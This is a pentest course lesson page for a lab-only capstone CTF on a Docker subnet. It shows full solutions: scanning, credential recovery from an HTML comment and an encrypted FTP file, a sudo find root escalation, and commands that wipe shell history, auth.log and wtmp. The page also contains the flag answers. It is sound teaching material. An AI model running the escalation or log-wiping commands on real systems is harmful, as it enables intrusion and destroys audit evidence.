---
title: "Full-Chain Capstone CTF"
teaching: 15
exercises: 100
---

:::::::::::::::::::::::::::::::::::::: questions

- Can you chain reconnaissance, enumeration, gaining access, and privilege
  escalation into one unaided engagement, the way a real pentest works?
- How do web recon, anonymous FTP enumeration, and OpenSSL decryption
  combine to produce a usable credential?
- How does a sudo misconfiguration turn a low-privilege shell into root?
- What does covering your tracks look like when the target's own logging
  is incomplete?

::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: objectives

- Discover live hosts and open ports on an unfamiliar subnet with no target
  list, using nmap host discovery and full port/service scans
- Enumerate a web server and an anonymous FTP server for information leakage
- Decrypt an OpenSSL-encrypted file using a passphrase recovered from web
  recon
- Use recovered credentials to gain SSH access and retrieve a user flag
- Identify and exploit a `sudo` misconfiguration with a GTFOBins technique
  to escalate to root
- (Bonus) Apply covering-tracks techniques from Lab 11 to a target host,
  and recognize when a target's own logging is too sparse to fully verify
- Write a short recon-to-root narrative summarizing a full engagement, the
  way you would open a real pentest report

::::::::::::::::::::::::::::::::::::::::::::::::

## Introduction

This is the capstone. There's no hand-holding this time: one target
network, three services, and no given credentials. You run the entire
chain yourself — reconnaissance, enumeration, gaining access, and
(optionally) maintaining access and covering tracks — using nothing but
the tools and techniques you already built real competency with across
the eleven earlier phase labs. It's modeled on the classic De-ICE-style
"simulated corporate network" beginner pentest box — the same shape of
exercise you'll find on VulnHub and HackTheBox's easier machines.

**This episode assumes you've completed the earlier phase labs** (recon
and scanning, enumeration, gaining access, maintaining access, and
covering tracks). It reuses those skills without re-teaching them — if a
step here feels unfamiliar, go back to the lab that first introduced it.

::::::::::::::::::::::::::::::::::::: callout

### Scope note

Every command below targets only the containers started by this lab's own
`docker-compose.yaml` (subnet `10.10.12.0/24`). Don't point these tools
anywhere else. See the [statutory warning on the lesson home page](../index.html)
and [Setup](../learners/setup.html) before you begin.

::::::::::::::::::::::::::::::::::::::::::::::::

**Tools used:** everything from the earlier labs — `nmap`, `curl`/browser
recon, `ftp`, `openssl`, `ssh`, `sudo -l`, GTFOBins, and the log-clearing
techniques from the covering-tracks lab.

**Network map:** subnet `10.10.12.0/24` — that's all you get. No target
list, no service map; go find them.

| Container | IP | Role |
|-----------|-----|------|
| `lab12-attacker` | 10.10.12.2 | Your Kali-based attack box |
| *(3 more targets)* | ? | Web, FTP, and SSH services — find them yourself |

Follow [Setup](../learners/setup.html), then:

```bash
cd episodes/files/lab12-full-chain-ctf
docker compose up -d
docker exec -it lab12-attacker bash
```

## Milestone 1: Reconnaissance & Scanning (Phase 1–2)

Map the network. You have no target list — find every live host and every
open port yourself.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 1: Find every live host and open port

Which tool(s) will you use, and why those specifically for this step? Then
fill in a table of every host IP you find, its open ports, and the
services running on them.

:::::::::::::::::::::::: solution

**Tool:** `nmap` — a ping sweep first to find live hosts with no prior
target list, then a full-port service scan against whatever you find:

```bash
nmap -sn 10.10.12.0/24
nmap -sV -p- 10.10.12.10 10.10.12.11 10.10.12.12
```

| Host IP | Open Ports | Services |
|---------|-----------|----------|
| `10.10.12.10` | 80 | HTTP (nginx) |
| `10.10.12.11` | 21 | FTP (vsftpd) |
| `10.10.12.12` | 22 | SSH (OpenSSH) |

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Milestone 2: Enumeration (Phase 2)

Each service you found has more to give up than just "it's open."

- The web server has something worth reading in its page source.
- The FTP server allows anonymous access — see what's in there.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 2: Enumerate the web server and FTP server

What did the web page tell you? What files did you find on FTP, and what's
unusual about one of them?

:::::::::::::::::::::::: solution

Viewing the page source of the web server (`10.10.12.10`) turns up an HTML
comment left in by IT:

```bash
curl -s http://10.10.12.10 | grep -i passphrase
```

> `<!-- IT note: temp passphrase for this quarter's encrypted backups is
> Summer2024! - rotate before audit -->`

Anonymous FTP to `10.10.12.11` lists three files in `pub/`:

```bash
ftp 10.10.12.11
# Name: anonymous
cd pub
ls
get employees.txt
get backup.enc
quit
```

- `README.txt` — a generic onboarding-archive banner
- `employees.txt` — a staff directory listing usernames, including `jdoe`
- `backup.enc` — the unusual one: a binary file with a `.enc` extension,
  clearly OpenSSL-encrypted rather than a normal document

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Milestone 3: Gaining Access (Phase 3)

One of the FTP files is encrypted. The web page gave you something that
looks like it could unlock it.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 3: Decrypt the backup and log in

What tool decrypts an OpenSSL-encrypted file if you have the passphrase?
What did decrypting it reveal? Log in with what you found — whose account,
and what flag did you get?

:::::::::::::::::::::::: solution

`openssl enc -d` decrypts a file that was encrypted with `openssl enc`,
given the matching algorithm and passphrase:

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in backup.enc -pass pass:Summer2024!
```

Output: `jdoe SSH password: N3wHire2024#`

That's a username (matching the `jdoe` entry from `employees.txt`) and a
password for the SSH host you found in Milestone 1:

```bash
ssh jdoe@10.10.12.12
# password: N3wHire2024#
cat user.txt
```

Account: `jdoe`. Flag: `flag{lab12_ftp_to_ssh_creds_chain}`

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Milestone 4: Privilege Escalation (Phase 3/4 boundary)

You're in, but not as root yet. Check what your current user is allowed to
run with elevated privileges.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 4: Escalate to root

What command checks what you can run via `sudo` without further evidence
of who you are? What did it show, and how does that let you get a root
shell? What's the root flag?

:::::::::::::::::::::::: solution

```bash
sudo -l
```

Shows: `(ALL) NOPASSWD: /usr/bin/find`

`jdoe` can run `find` as root with no password. [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
documents the standard technique for turning that into a root shell —
`find`'s `-exec` flag will run any command you give it, and since `find`
itself is running as root, so does whatever it execs:

```bash
sudo find . -exec /bin/sh \; -quit
whoami
cat /root/root.txt
```

Flag: `flag{lab12_full_chain_root}`

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Milestone 5 (Bonus): Cover Your Tracks (Phase 5)

Using what you practiced in the covering-tracks lab: clear your bash
history, remove your entries from `/var/log/auth.log`, and clear
`/var/log/wtmp` on whichever host you actually logged into. There's no
automated checker this time — you're on your own to verify it properly.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 5: Clear your tracks and verify

What did you check to confirm you were actually clean?

:::::::::::::::::::::::: solution

From your SSH session as `jdoe`, before/around escalating:

```bash
unset HISTFILE
history -c
> ~/.bash_history
```

As root (from the shell you got via `find`):

```bash
sed -i '/10.10.12.2/d' /var/log/auth.log 2>/dev/null
> /var/log/wtmp 2>/dev/null
```

A correct verification re-checks `history`, re-reads `~/.bash_history`,
and greps `/var/log/auth.log` and `last`/`/var/log/wtmp` for your
attacker IP (`10.10.12.2`) or username to confirm nothing remains.

Note: this target's minimal image may not have `auth.log`/`wtmp`
populated the way the covering-tracks lab's target did, since it has no
`rsyslog` running. If that's what you found, say so in your report — the
target's own logging being insufficient to reconstruct your activity is
itself a real, reportable finding.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Full Chain Summary

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 6: Write the engagement summary

Write a short recon-to-root narrative — the kind of summary you'd put at
the top of a real pentest report.

:::::::::::::::::::::::: solution

There's no single correct wording, but a good summary names every link in
the chain and the technique used at each step. For example:

> Web recon of `10.10.12.10` exposed a passphrase left in an HTML comment.
> Anonymous FTP access on `10.10.12.11` yielded a staff list and an
> OpenSSL-encrypted backup file; the leaked passphrase decrypted it,
> revealing SSH credentials for user `jdoe`. Those credentials granted
> shell access to `10.10.12.12` and the user flag. A `sudo` misconfiguration
> (passwordless `find`) allowed privilege escalation to root via a
> documented GTFOBins technique, yielding the root flag. Every step
> chained a tool or technique introduced in an earlier lab, with no hints
> given — reflecting how a real beginner-to-intermediate engagement plays
> out end to end.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Full Chain Objective

Two flags are hidden on `10.10.12.0/24`:

- `user.txt` — via a chain: web recon → FTP enumeration → decrypt a file →
  SSH login
- `root.txt` — via a sudo misconfiguration privilege escalation

**Rules:**

- Targets: `10.10.12.0/24` only
- Attack from: `lab12-attacker`
- Flag format: `flag{...}`
- No target list is given on purpose — find everything yourself

No hints below — ask your instructor if you get stuck.

:::::::::::::::::::::::: instructor

The full CTF walkthrough for this lab (including both flag values and the
exact end-to-end attack chain) is provided separately to instructors, so
it stays out of a learner's browser history/search results. See
[Lab 12 Notes](../instructors/lab12-notes.html).

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Cleanup

```bash
exit
cd episodes/files/lab12-full-chain-ctf
docker compose down
```

:::::::::::::::::::::::::::::::::::::: keypoints

- A real engagement starts with no target list — host discovery
  (`nmap -sn`) and full service scans (`nmap -sV -p-`) are how you build
  one from scratch
- Enumeration turns "the service is open" into usable intelligence: page
  source, HTML comments, and anonymous FTP shares routinely leak
  credentials and internal file names
- Small leaks compound: a passphrase in a comment plus a stray encrypted
  file plus a staff list is enough to reconstruct valid SSH credentials
  with nothing else given
- `sudo -l` and GTFOBins turn "I have a shell" into "I have root" whenever
  a sudo rule is misconfigured — always check what you're allowed to run
  before assuming you're stuck
- Covering tracks only works as well as the target's own logging allows —
  a minimal, unmonitored host can be harder to reconstruct activity on,
  which is itself worth reporting
- Every phase from reconnaissance through covering tracks is one
  continuous workflow, not a set of isolated skills — this lab is proof
  you can run that workflow unaided, start to finish
- Writing a short recon-to-root narrative at the end is the same habit
  you'll need on a real engagement report

::::::::::::::::::::::::::::::::::::::::::::::::
